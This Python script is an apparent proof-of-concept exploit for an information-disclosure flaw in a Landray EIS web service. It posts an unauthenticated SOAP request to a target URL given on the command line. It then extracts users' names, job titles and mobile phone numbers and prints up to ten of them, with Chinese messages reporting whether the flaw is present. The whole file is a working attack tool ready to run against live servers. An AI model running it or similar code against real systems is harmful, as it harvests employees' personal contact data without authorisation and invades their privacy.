#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec
from base64 import b64decode
import requests,re,urllib3
import base64
import sys
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def verify(site):
    burp0_url = site + "/WS/Basic/Basic.asmx"
    burp0_headers = {"Content-Type": "text/xml"}
    burp0_data = "\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n<tem:WS_getAllInfos/>\r\n</soapenv:Body>\r\n</soapenv:Envelope>"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    n = 0
    infolist = []
    for item in r.text.split("<WS_Person>"):
        try:
            infolist.append(re.findall("<NAME>([^<]*)</NAME>", item, re.I)[0]+"\t"+re.findall("<JOB_TITLE>([^<]*)</JOB_TITLE>", item, re.I)[0]+"\t"+re.findall("<CELL_PHONE_NUMBER>([^<]*)</CELL_PHONE_NUMBER>", item, re.I)[0])
        except:
            continue
    return infolist
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 landray-eis-ws-infoleak.py ",target)
    info = verify(target)
    if len(info) != 0:
        print("[+]漏洞存在，泄露的用户信息如下：")
        for i in info[:10]:
            print(i)
    else:
        print("[-]漏洞不存在")
